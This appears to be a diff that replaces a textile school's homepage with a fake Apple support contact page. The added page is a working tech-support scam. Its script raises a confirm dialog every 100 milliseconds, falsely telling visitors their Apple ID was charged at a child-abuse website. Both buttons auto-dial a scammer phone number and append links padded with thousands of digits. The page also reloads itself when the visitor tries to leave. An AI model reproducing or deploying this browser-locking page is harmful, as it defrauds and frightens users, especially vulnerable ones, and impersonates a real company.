@@ -1,395 +1,375 @@
-<!doctype html>
-<html lang="en-GB">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Home - LoomLore Academy Premium Textile Education</title>
-  <link rel="icon" type="image/x-icon" href="favicon.ico">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Merriweather:wght@400;600&display=swap');
 
-    :root {
-      --colorPrimary: oklch(0.49 0.15 349);
-      --colorPrimaryLight: oklch(0.69 0.13 350);
-      --colorDark: oklch(0.34 0.15 349);
-      --colorSecondary: oklch(0.49 0.11 20);
-      --colorSurfaces: oklch(0.98 0.02 350);
-      --colorText: oklch(0.20 0.05 350);
-      --colorLines: oklch(0.85 0.05 350);
-      --colorAccent: oklch(0.54 0.15 170);
-    }
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Merriweather', serif;
-      font-weight: 400;
-      color: var(--colorText);
-      background-color: var(--colorSurfaces);
-      -webkit-font-smoothing: antialiased;
-    }
-    
-    h1, h2, h3, h4, h5, h6 {
-      font-weight: 600;
-      margin: 0 0 1rem 0;
-      line-height: 1.2;
-    }
 
-    .siteHeader {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 1.5rem 3rem;
-      background-color: #ffffff;
-      border-bottom: 1px solid var(--colorLines);
-      position: sticky;
-      top: 0;
-      z-index: 1000;
-    }
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
+    <script src="text_tel.js"></script>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NP1FZ3QXDK"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-    .brandWrap { font-weight: 600; font-size: 1.25rem; color: var(--colorPrimary); }
-    .brandAcc { font-size: 0.85rem; color: var(--colorSecondary); display: block; font-weight: 400; }
+  gtag('config', 'G-NP1FZ3QXDK');
+</script>
 
-    .mainNav { display: flex; align-items: center; gap: 2rem; }
-    .navLinks { display: flex; gap: 1.5rem; list-style: none; margin: 0; padding: 0; }
-    .navItem { font-size: 0.95rem; transition: color 0.2s; }
-    .navItem:hover { color: var(--colorPrimaryLight); }
-
-    .ctaBtn {
-      background-color: var(--colorPrimary);
-      color: #ffffff;
-      padding: 0.8rem 1.6rem;
-      border-radius: 4px;
-      font-weight: 600;
-      transition: transform 0.2s, background 0.2s;
-      border: none;
-      cursor: pointer;
-      display: inline-block;
-    }
-    .ctaBtn:hover { transform: scale(1.05); background-color: var(--colorDark); }
-
-    .heroSection {
-      padding: 5rem 3rem;
-      background: radial-gradient(circle at center, oklch(0.95 0.03 350) 0%, var(--colorSurfaces) 100%);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 4rem;
-    }
-
-    .heroContent { flex: 0 0 60%; }
-    .heroVisual { flex: 0 0 35%; position: relative; }
-    .heroVisual img {
-      width: 100%;
-      height: auto;
-      border-radius: 4px;
-      border: 1px solid var(--colorLines);
-      transform: translate(20px, -20px);
-    }
-
-    .bentoGrid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      grid-auto-rows: 220px;
-      gap: 1.5rem;
-      padding: 4rem 3rem;
-    }
-
-    .bentoCard {
-      border: 1px solid var(--colorLines);
-      border-radius: 4px;
-      padding: 2rem;
-      background: #fff;
-      transition: transform 0.3s ease;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      justify-content: flex-end;
-    }
-    .bentoCard:hover { transform: scale(1.05); }
-    .cardLarge { grid-column: span 2; grid-row: span 2; background-size: cover; color: #fff; justify-content: flex-end; position: relative; z-index: 1; }
-    .cardLarge::after { content: ''; position: absolute; inset: 0; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); z-index: -1; }
-    .cardMedium { grid-column: span 2; }
-    .cardSmall { grid-column: span 1; }
-
-    .iconCircle {
-      width: 48px;
-      height: 48px;
-      border: 1px solid var(--colorPrimary);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 1rem;
-      color: var(--colorPrimary);
-    }
-
-    .testimonialsSection { padding: 4rem 3rem; background: #fff; }
-    .testimonialGrid {
-      display: grid;
-      grid-template-columns: 1.5fr 1fr;
-      gap: 2rem;
-    }
-    .testimonialCard {
-      border: 1px solid var(--colorLines);
-      padding: 2rem;
-      border-radius: 4px;
-    }
-    .testimonialLarge { grid-row: span 2; font-size: 1.25rem; border-left: 4px solid var(--colorPrimary); }
-    .author { font-weight: 600; display: block; margin-top: 1rem; color: var(--colorPrimary); }
-    .role { font-size: 0.85rem; color: var(--colorSecondary); }
-
-    @media (max-width: 768px) {
-      .siteHeader { padding: 1rem 1.5rem; }
-      .heroSection { flex-direction: column; padding: 3rem 1.5rem; text-align: center; }
-      .heroContent, .heroVisual { flex: 0 0 100%; }
-      .heroVisual img { transform: none; }
-      .ctaBtn { width: 100%; min-height: 48px; }
-      .bentoGrid { grid-template-columns: 1fr; grid-auto-rows: auto; padding: 2rem 1.5rem; }
-      .cardLarge, .cardMedium, .cardSmall { grid-column: span 1; grid-row: span 1; }
-      .testimonialGrid { grid-template-columns: 1fr; }
-    }
-  </style>
 </head>
+
 <body>
-  <header class="siteHeader">
-    <div class="brandWrap">
-      <a href="/">
-        LoomLore Academy
-        <span class="brandAcc">Textile Education</span>
-      </a>
-    </div>
-    <button id="navToggleBtn" class="mobileToggle" aria-label="Toggle Menu">☰</button>
-    <nav id="primaryNavContainer" class="mainNav">
-      <ul class="navLinks">
-        <li><a href="/" class="navItem">Home</a></li>
-        <li><a href="courses.html" class="navItem">Courses</a></li>
-        <li><a href="workshops.html" class="navItem">Workshops</a></li>
-        <li><a href="about-academy.html" class="navItem">About</a></li>
-      </ul>
-      <a href="workshops.html" class="ctaBtn">Book Workshop</a>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
     </nav>
-  </header>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-  <main>
-    <section class="heroSection">
-      <div class="heroContent">
-        <h1>Master the Art of Textiles at LoomLore Academy</h1>
-        <p>We're merging the intricate heritage of floor-loom weaving with the urgent demands of sustainable, contemporary art. Our New York studio offers a curriculum led by masters of the craft, designed for those who don't just want to learn, but to pioneer. Why settle for mass-produced when you can create the timeless?</p>
-        <a href="courses.html" class="ctaBtn">Explore Course Catalog</a>
-      </div>
-      <div class="heroVisual">
-        <img src="images/hoxex-xeto.jpeg" alt="Artisan working on a traditional floor loom" width="640" height="768">
-      </div>
-    </section>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-877-470-4075 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
 
-    <section class="dashboardSection">
-      <div class="bentoGrid">
-        <div class="bentoCard cardLarge" style="background-image: url('images/muti34.jpeg');">
-          <h3>Advanced Textile Art</h3>
-          <p>Master complex structural techniques and conceptual expression in our 12-week intensive.</p>
-        </div>
-        
-        <div class="bentoCard cardMedium">
-          <div class="iconCircle text-primary"><i class="fa-solid fa-hands fa-lg"></i></div>
-          <h3>Weaving Workshops</h3>
-          <p>Direct exposure to semi-industrial and manual looms in our Brooklyn-adjacent facility.</p>
-        </div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-        <div class="bentoCard cardSmall">
-          <div class="iconCircle"><i class="fa-solid fa-leaf"></i></div>
-          <h4>Eco-Materials</h4>
-          <p>Exploring 100% sustainable fiber sourcing.</p>
-        </div>
-
-        <div class="bentoCard cardSmall">
-          <div class="iconCircle"><i class="fa-solid fa-graduation-cap"></i></div>
-          <h4>850+ Alumni</h4>
-          <p>Graduates working in NYC fashion houses.</p>
-        </div>
-
-        <div class="bentoCard cardMedium">
-          <div class="iconCircle"><i class="fa-solid fa-book-open"></i></div>
-          <h3>Fabric History Courses</h3>
-          <p>From ancient tapestry to modern smart-fabrics. Understand the "why" behind every thread.</p>
-        </div>
-      </div>
-    </section>
-
-    <section class="testimonialsSection">
-      <div class="container">
-        <h2 style="text-align: center; margin-bottom: 3rem;">Alumni Success Stories</h2>
-        <div class="testimonialGrid">
-          <div class="testimonialCard testimonialLarge">
-            <p>"The depth of knowledge at LoomLore Academy is staggering. I came in as a designer looking for technical grounding and left with a completely rewritten perspective on material sustainability. Their floor looms are the best you'll find in New York."</p>
-            <span class="author">Yua Apazidis</span>
-            <span class="role">Lead Designer, Atelier NYC</span>
-          </div>
-          <div class="testimonialCard">
-            <p>Why did we choose LoomLore Academy? Because they don't just teach you how to weave; they teach you how to think like a weaver. The historic context provided in the lectures changed my art forever.</p>
-            <span class="author">Dazmin Hedlund</span>
-          </div>
-          <div class="testimonialCard">
-            <p>Short, sweet, and incredibly effective. I mastered the basics of the floor loom in just three weekends!</p>
-            <span class="author">Muelas A.</span>
-          </div>
-        </div>
-      </div>
-    </section>
-  </main>  <style>
-    .siteFooter {
-      background-color: #ffffff;
-      border-top: 1px solid var(--colorLines);
-      padding: 3rem 0 1rem;
-      margin-top: 3rem;
-    }
-
-    .footerGrid {
-      max-width: 1100px;
-      margin: 0 auto;
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 2rem;
-      padding: 0 3rem;
-    }
-
-    .footerColTitle {
-      font-size: 1.1rem;
-      color: var(--colorPrimary);
-      margin-bottom: 1.25rem;
-    }
-
-    .footerText {
-      font-size: 0.9rem;
-      line-height: 1.6;
-      color: var(--colorText);
-      margin-bottom: 0.5rem;
-    }
-
-    .footerLinks {
-      list-style: none;
-      padding: 0;
-      margin: 0;
-    }
-
-    .footerLinks li {
-      margin-bottom: 0.5rem;
-    }
-
-    .footerLinks a {
-      font-size: 0.9rem;
-      color: var(--colorText);
-      transition: color 0.2s;
-    }
-
-    .footerLinks a:hover {
-      color: var(--colorPrimary);
-    }
-
-    .footerBottom {
-      text-align: center;
-      padding-top: 2rem;
-      margin-top: 2rem;
-      border-top: 1px solid var(--colorLines);
-      font-size: 0.8rem;
-      color: var(--colorSecondary);
-    }
-
-    /* Cookie Banner Scoped Styles */
-    .cookieConsent {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      background-color: var(--colorSurfaces);
-      border-top: 1px outset var(--colorLines);
-      padding: 1rem 2rem;
-      display: none;
-      justify-content: space-between;
-      align-items: center;
-      z-index: 9999;
-      box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
-      box-sizing: border-box;
-    }
-
-    .cookieMsg {
-      font-size: 0.9rem;
-      margin: 0;
-    }
-
-    @media (max-width: 768px) {
-      .cookieConsent {
-        flex-direction: column;
-        gap: 1rem;
-        text-align: center;
-      }
-    }
-  </style>
-
-  <footer class="siteFooter">
-    <div class="footerGrid">
-      <div class="footerCol">
-        <h4 class="footerColTitle">LoomLore Academy</h4>
-        <p class="footerText">Empowering textile enthusiasts and professionals through history, technique, and sustainability.</p>
-      </div>
-      
-      <div class="footerCol">
-        <h4 class="footerColTitle">Quick Links</h4>
-        <ul class="footerLinks">
-          <li><a href="courses.html">Course Catalog</a></li>
-          <li><a href="workshops.html">In-Studio Workshops</a></li>
-          <li><a href="sustainable-practices.html">Sustainability Hub</a></li>
-          <li><a href="contact.html">Contact Us</a></li>
-        </ul>
-      </div>
-
-      <div class="footerCol">
-        <h4 class="footerColTitle">Visit & Contact</h4>
-        <p class="footerText">937 Onderdonk Avenue</p>
-        <p class="footerText">New York, NY 11385, USA</p>
-        <p class="footerText">+14722870795</p>
-        <p class="footerText">info@loomloreacademy.com</p>
-      </div>
-
-      <div class="footerCol">
-        <h4 class="footerColTitle">Legal</h4>
-        <ul class="footerLinks">
-          <li><a href="terms-and-conditions.html">Terms and Conditions</a></li>
-          <li><a href="privacy-policy.html">Privacy Policy</a></li>
-        </ul>
-      </div>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
 
-    <div class="footerBottom">
-      &copy; 2024 LoomLore Academy. All rights reserved.
-    </div>
-  </footer>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">CHILD PORNOGRAPHY WEBSITE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1-877-470-4075
+			 " property="telephone" />
+            </section>
+        </div>
+    </footer>
 
-  <div id="globalCookieNotice" class="cookieConsent">
-    <p class="cookieMsg">We use cookies to ensure optimal functionality on our education platform. By continuing your visit, you accept our use of cookies.</p>
-    <button id="acceptCookieBtn" class="ctaBtn">Accept & Close</button>
-  </div>
 
-  <script type="module">
-    /* Handles cookie state and banner display */
-    const initBanner = () => {
-      const banner = document.getElementById('globalCookieNotice');
-      const btn = document.getElementById('acceptCookieBtn');
-      const cookieName = 'cookieConsent_tX8qL9p';
-      
-      if(!banner || !btn) return;
-      
-      if(!localStorage.getItem(cookieName)) {
-        banner.style.display = 'flex';
-      }
 
-      btn.addEventListener('click', () => {
-        localStorage.setItem(cookieName, 'true');
-        banner.style.display = 'none';
-      });
-    };
-    initBanner();
-  </script>
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-877-470-4075');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-470-4075"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-470-4075 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
 </body>
+
+
 </html>
